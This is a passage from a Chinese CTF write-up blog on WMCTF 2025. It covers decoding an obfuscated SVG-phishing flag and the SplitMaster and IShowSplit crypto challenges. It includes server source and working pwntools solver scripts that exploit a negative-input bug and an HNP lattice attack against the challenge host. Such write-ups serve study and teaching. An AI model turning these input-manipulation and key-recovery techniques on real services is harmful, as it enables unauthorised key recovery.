class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这也太长了，直接丢给<code>ai</code>，<code>ChatGPT</code>和<code>Gemini</code>都分析出来了，<code>字符串映射</code>+<code>异或</code>，最后通过<strong>人工智能</strong>强大的文本分析能力，直接暴力地把<code>flag</code>给弄出来了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">polymorphicData = [</span><br><span class="line">    <span class="string">&#x27;V01DVEZbZmFrZV9mbGFnXQ==&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bm90X3RoZV9yZWFsX2ZsYWc=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ZGVjb3lfZGF0YQ==&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">charMap = &#123;</span><br><span class="line">    <span class="string">&#x27;4p2V&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;4p2P&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;4p2F&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;4p2g&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;4p2a&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2c&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;4oyI&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;4p2T&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;77iP&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2S&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2L&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2D&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;4p2O&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2M&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2d&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;77iO&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;4p2b&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4p2Z&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4oyL&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;77iM&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2J&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2B&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2R&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;4p2h&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4p2X&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2H&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4pyx&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4p2I&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2A&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2C&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2Y&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;4p2j&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;77iK&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2U&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2K&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2N&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2E&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;4oyM&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;77iL&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;4py9&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;77iN&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2W&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2Q&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2G&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4py8&#x27;</span>: <span class="string">&#x27;!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4py7&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py6&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py5&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py4&#x27;</span>: <span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;|&#x27;</span>.join(re.escape(k)</span><br><span class="line">                     <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(charMap.keys(), key=<span class="keyword">lambda</span> x: -<span class="built_in">len</span>(x))))</span><br><span class="line">stage1Results = []</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]:</span><br><span class="line">    part = polymorphicData[idx]</span><br><span class="line">    decoded = pattern.sub(<span class="keyword">lambda</span> m: charMap[m.group(<span class="number">0</span>)], part)</span><br><span class="line">    stage1Results.append(decoded)</span><br><span class="line"></span><br><span class="line">combined = <span class="string">&#x27;&#x27;</span>.join(stage1Results)</span><br><span class="line"><span class="built_in">print</span>(stage1Results)</span><br><span class="line"><span class="built_in">print</span>(combined)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;wmctwf&#123;SVG_Pchis&#x27;, &#x27;hing_iAtt&#123;aic_k&#x27;, &#x27;_&#123;Dgeitte&#123;cit_i&#x27;, &#x27;o&#123;ng_iEtv&#123;ais_i&#x27;, &#x27;o&#123;ng&#125;i!t!&#123;!i!_!&#x27;]</span></span><br><span class="line"><span class="comment"># wmctwf&#123;SVG_Pchishing_iAtt&#123;aic_k_&#123;Dgeitte&#123;cit_io&#123;ng_iEtv&#123;ais_io&#123;ng&#125;i!t!&#123;!i!_!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wmctf&#123;SVG_Phishing_Attack_Detection_Evasion&#125;</span></span><br><span class="line"><span class="comment"># 翻译过来就是：SVG 嵌入式钓鱼攻击检测</span></span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SplitMaster-14-solved"><a href="#SplitMaster-14-solved" class="headerlink" title="SplitMaster* | 14 solved"></a>SplitMaster* | 14 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_master</span>(<span class="params">B_decimal, segment_bits</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(segment_bits) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits) != <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    n = <span class="built_in">len</span>(segment_bits)</span><br><span class="line">    found_combination = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line">        <span class="keyword">for</span> indices <span class="keyword">in</span> combinations(<span class="built_in">range</span>(n), k):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices) &gt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(indices)):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(indices)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">abs</span>(indices[i] - indices[j]) &lt;= <span class="number">1</span>:</span><br><span class="line">                        valid = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> indices <span class="keyword">and</span> (n-<span class="number">1</span>) <span class="keyword">in</span> indices:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(segment_bits[i]&gt;=<span class="number">25</span> <span class="keyword">for</span> i <span class="keyword">in</span> indices):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            found_combination = indices</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    binary_str = <span class="built_in">bin</span>(B_decimal)[<span class="number">2</span>:].zfill(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_str) &gt; <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"></span><br><span class="line">    segments_binary = []</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bits <span class="keyword">in</span> segment_bits:</span><br><span class="line">        end = start + bits</span><br><span class="line">        segments_binary.append(binary_str[start:end])</span><br><span class="line">        start = end</span><br><span class="line">    </span><br><span class="line">    segments_decimal = [<span class="built_in">int</span>(segment, <span class="number">2</span>) <span class="keyword">for</span> segment <span class="keyword">in</span> segments_binary]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [segments_decimal[i] <span class="keyword">for</span> i <span class="keyword">in</span> found_combination]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置socket超时而不是使用signal.alarm</span></span><br><span class="line">        self.request.settimeout(<span class="number">90</span>)  <span class="comment"># 90秒超时</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="string">b&#x27;WMCTF&#123;test&#125;&#x27;</span></span><br><span class="line">            self.send(<span class="string">b&quot;Welcome to WMCTF2025&quot;</span>)</span><br><span class="line">            key = getPrime(<span class="number">512</span>)</span><br><span class="line">            <span class="built_in">print</span>(key)</span><br><span class="line">            q = getPrime(<span class="number">512</span>)</span><br><span class="line">            self.send(<span class="string">b&quot;q:&quot;</span>+<span class="built_in">str</span>(q).encode())</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">                a = getPrime(<span class="number">512</span>)</span><br><span class="line">                b = a * key % q</span><br><span class="line">                gift = split_master(b, <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, self.recv(<span class="string">b&quot;&gt; &quot;</span>).split())))</span><br><span class="line">                self.send(<span class="string">b&quot;a:&quot;</span>+<span class="built_in">str</span>(a).encode())</span><br><span class="line">                self.send(<span class="string">b&quot;gift:&quot;</span>+<span class="built_in">str</span>(gift).encode())</span><br><span class="line">            x = self.recv(<span class="string">b&quot;the key to the flag is: &quot;</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> x == <span class="built_in">str</span>(key):</span><br><span class="line">                self.send(flag)</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            self.send(<span class="string">b&quot;Time&#x27;s up!&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            self.request.close()  <span class="comment"># 确保连接被关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10003</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HOST:POST &quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT))</span><br><span class="line">    server = ThreadedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p><code>split_master()</code>将一个数进行分割，<strong>进行输出的分段</strong>要求分割序列：</p><ul><li>分段的总比特数不大于30</li><li>单个分段的比特数不大于25</li><li>分段不能相邻</li><li>非首+尾</li></ul><p>$b_{i}\equiv a_{i}*key\pmod p$</p><p>$B_{i}=b_{i,know}$<br>$C_{i}=b_{i,unknown}$</p><p>$a_{i}\cdot key-B_{i}\equiv C_{i}\pmod p$</p><p>$HNP隐藏数问题，已知的是a_{i},p,gift_{i}$<br>$有20轮可以泄露b的一部分信息$</p><p>有点棘手，没解出来……</p><p>诶诶诶，原来有<strong>非预期</strong>吗？我们可以输入<strong>负数</strong>从而获取到更多的位数，比如<code>SU-wp</code>的<code>-3 1 1 513</code>，会得到<strong>高509位</strong>和<strong>低第2位</strong>，这个是最方便且最连续的打法(尝试<code>-2</code>的话，你会发现服务器没有反应)，只需要<strong>爆破未知的两位</strong>即可，可以通过两组数据来进行校验<code>key</code>是否正确</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;62.234.144.69&quot;</span>, <span class="number">30113</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;q:&quot;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = []</span><br><span class="line">gift = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;-3 1 1 513&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;a:&quot;</span>)</span><br><span class="line">    a.append(<span class="built_in">int</span>(io.recvline().strip().decode()))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">    g0, g1 = <span class="built_in">map</span>(<span class="built_in">int</span>, io.recvline().strip()[<span class="number">1</span>: -<span class="number">1</span>].decode().split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">    gift.append([g0, g1])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> binlist <span class="keyword">in</span> product([<span class="number">0</span>, <span class="number">1</span>], repeat=<span class="number">4</span>):</span><br><span class="line">    b0, b1, b2, b3 = binlist</span><br><span class="line">    B0 = (gift[<span class="number">0</span>][<span class="number">0</span>] &lt;&lt; <span class="number">3</span>) + (b0 &lt;&lt; <span class="number">2</span>) + (gift[<span class="number">0</span>][<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) + b1</span><br><span class="line">    B1 = (gift[<span class="number">1</span>][<span class="number">0</span>] &lt;&lt; <span class="number">3</span>) + (b2 &lt;&lt; <span class="number">2</span>) + (gift[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) + b3</span><br><span class="line">    key1 = B0 * inverse_mod(a[<span class="number">0</span>], q) % q</span><br><span class="line">    key2 = B1 * inverse_mod(a[<span class="number">1</span>], q) % q</span><br><span class="line">    <span class="keyword">if</span> key1 == key2:</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(key1).encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] flag: &quot;</span>, io.recvline().strip().decode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># WMCTF&#123;Th3_d1ff1culty_Is_up_t0_y0u&#125;</span></span><br></pre></td></tr></table></figure><p><code>N1-wp</code>用的是<code>-257 513 -257 513</code>，会得到<strong>高255位</strong>和<strong>第257至第511位</strong>，未知的是<strong>第256位</strong>和<strong>第512位</strong>，还贴了<code>HNP</code>的<strong>格子</strong>，得偷一波</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;62.234.144.69&quot;</span>, <span class="number">30113</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;q:&quot;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babai</span>(<span class="params">B, t</span>):</span><br><span class="line">    B = B.LLL()</span><br><span class="line">    G = B.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">    b = t</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(G.nrows())):</span><br><span class="line">        b -= B[i] * ((b * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">    <span class="keyword">return</span> t - b</span><br><span class="line"></span><br><span class="line">m = matrix(ZZ, <span class="number">21</span>, <span class="number">21</span>)</span><br><span class="line">v = vector(ZZ, <span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">W = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m[<span class="number">0</span>, <span class="number">20</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    io.send(<span class="string">b&quot;-257 513 -257 513&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;a:&quot;</span>)</span><br><span class="line">    a = <span class="built_in">int</span>(io.recvline().decode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">    gift = literal_eval(io.recvline().decode())</span><br><span class="line">    m[<span class="number">0</span>, i] = a * W</span><br><span class="line">    m[i + <span class="number">1</span>, i] = q * W</span><br><span class="line">    v[i] = (gift[<span class="number">0</span>] &lt;&lt; <span class="number">257</span>) * W</span><br><span class="line">sol = babai(m, v)</span><br><span class="line"><span class="built_in">print</span>([e.nbits() <span class="keyword">for</span> e <span class="keyword">in</span> sol - v])</span><br><span class="line">sol[-<span class="number">1</span>] = sol[-<span class="number">1</span>] % q</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(sol[-<span class="number">1</span>]).encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] flag: &quot;</span>, io.recvline().strip().decode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>可以参考学习<a href="https://tover.xyz/p/HNP-note/#Level-3">Tover的笔记</a>，没太深入琢磨，应该能打吧……</p><h2 id="IShowSplit-8-solved"><a href="#IShowSplit-8-solved" class="headerlink" title="IShowSplit | 8 solved"></a>IShowSplit | 8 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_master</span>(<span class="params">B_decimal, segment_bits</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(segment_bits) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits) != <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    n = <span class="built_in">len</span>(segment_bits)</span><br><span class="line">    found_combination = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line">        <span class="keyword">for</span> indices <span class="keyword">in</span> combinations(<span class="built_in">range</span>(n), k):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices) &gt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(indices)):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(indices)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">abs</span>(indices[i] - indices[j]) &lt;= <span class="number">1</span>:</span><br><span class="line">                        valid = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> indices <span class="keyword">and</span> (n-<span class="number">1</span>) <span class="keyword">in</span> indices:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(segment_bits[i]&gt;=<span class="number">25</span> <span class="keyword">for</span> i <span class="keyword">in</span> indices):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            found_combination = indices</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    binary_str = <span class="built_in">bin</span>(B_decimal)[<span class="number">2</span>:].zfill(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_str) &gt; <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"></span><br><span class="line">    segments_binary = []</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bits <span class="keyword">in</span> segment_bits:</span><br><span class="line">        end = start + bits</span><br><span class="line">        segments_binary.append(binary_str[start:end])</span><br><span class="line">        start = end</span><br><span class="line">    </span><br><span class="line">    segments_decimal = [<span class="built_in">int</span>(segment, <span class="number">2</span>) <span class="keyword">for</span> segment <span class="keyword">in</span> segments_binary]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [segments_decimal[i] <span class="keyword">for</span> i <span class="keyword">in</span> found_combination]</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">key=randrange(<span class="number">1</span>,p)</span><br><span class="line">gift=split_master(key,[<span class="number">182</span>,<span class="number">20</span>,<span class="number">200</span>,<span class="number">10</span>,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;WMCTF&#123;&quot;</span>+md5(<span class="built_in">str</span>(key).encode()).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">A=[]</span><br><span class="line">B=[]</span><br><span class="line">R=[]</span><br><span class="line">M=[<span class="number">64</span>, <span class="number">128</span>, <span class="number">256</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    a=randrange(<span class="number">1</span>,p)</span><br><span class="line">    A.append(a)</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    rr=[]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        r=randrange(<span class="number">1</span>,p)</span><br><span class="line">        k=randrange(<span class="number">1</span>,<span class="number">2</span>^M[j])</span><br><span class="line">        s+=r*k%p</span><br><span class="line">        rr.append(r)</span><br><span class="line">    R.append(rr)</span><br><span class="line">    B.append((a*key+s)%p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span 